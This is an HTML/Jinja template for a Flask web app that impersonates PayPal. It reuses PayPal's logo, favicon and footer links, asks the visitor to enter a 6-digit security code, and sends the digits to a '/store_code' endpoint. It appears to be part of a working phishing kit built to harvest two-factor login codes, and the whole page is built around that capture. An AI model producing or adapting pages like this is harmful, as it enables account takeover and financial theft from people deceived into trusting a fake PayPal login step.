<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal</title>
  <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"/>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #fff;
      padding: 20px;
    }

    .container {
      text-align: center;
      width: 100%;
      max-width: 400px;
    }

    .logo {
      width: 60px;
      margin-bottom: 20px;
      margin-top: -50%;
    }

    h2 {
      font-size: 1.5rem ;
      font-weight: bold;
      margin-bottom: 10px;
      color: #000000;
    }

    p {
      color: #000000;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    .code-inputs input {
      width: 45px;
      height: 70px;
      text-align: center;
      font-size: 20px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-weight: bold;
    }

    /* ðŸ”´ Error style when Flask passes error=1 */
    .error-input {
      border: 2px solid red !important;
      background-color: #ffe6e6;
    }

    .btn {
      width: 100%;
      padding: 14px;
      background-color: #003087;
      color: white;
      border: none;
      border-radius: 25px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }

    .btn:hover {
      background-color: #005EA6;
    }

    .help-link {
      margin-top: 15px;
      display: block;
      color: #0070ba;
      font-size: 14px;
      text-decoration: underline;
      font-weight: bold;
    }

    .footer {
      position: fixed;
      bottom: 10px;
      left: 0;
      right: 0;
      text-align: center;
      font-size: 13px;
      color: #515354;
      background-color: #fafafa;
    }

    .footer a {
      color: #515354 ;
      text-decoration: none;
      margin: 0 5px;
      text-decoration: underline;
    }

    @media (max-width: 768px) {
      .code-inputs input {
        width: 40px;
        height: 50px;
        font-size: 18px;
      }
    }

    @media (max-width: 480px) {
      .container {
        max-width: 90%;
      }
      .logo {
        width: 50px;
      }
      h2 {
        font-size: 18px;
      }
      .code-inputs input {
        width: 38px;
        height: 45px;
        font-size: 16px;
      }
      .btn {
        font-size: 14px;
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="PayPal Logo" class="logo">
    <h2>Enter your code</h2>
    <p>Enter the 6-digit security code.</p>

    <form action="/store_code" method="post">
      <div class="code-inputs">
        {% for i in range(6) %}
  <input type="text" 
         name="digit{{ i }}" 
         maxlength="1" 
         required 
         inputmode="numeric" 
         pattern="[0-9]*"
         oninput="this.value=this.value.replace(/[^0-9]/g,'');"
         class="{% if error %}error-input{% endif %}">
{% endfor %}

      </div>
      <button type="submit" class="btn">Continue</button>
    </form>

    <a href="https://www.paypal.com/us/cshelp/topic/help_login_and_security_personal" class="help-link">Having trouble logging in?</a>

    <div class="footer">
      <a href="https://www.paypal.com/ae/smarthelp/contact-us">Contact Us</a>
      <a href="https://www.paypal.com/ae/webapps/mpp/ua/privacy-full">Privacy</a>
      <a href="https://www.paypal.com/ae/webapps/mpp/ua/legalhub-full">Legal</a>
      <a href="https://www.paypal.com/ae/webapps/mpp/country-worldwide">Worldwide</a>
    </div>
  </div>

  <script>
    const inputs = document.querySelectorAll('.code-inputs input');

    inputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        if (value.length > 1) {
          const chars = value.split('');
          inputs.forEach((box, i) => box.value = chars[i] || '');
        } else if (value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });
  </script>
</body>
</html>
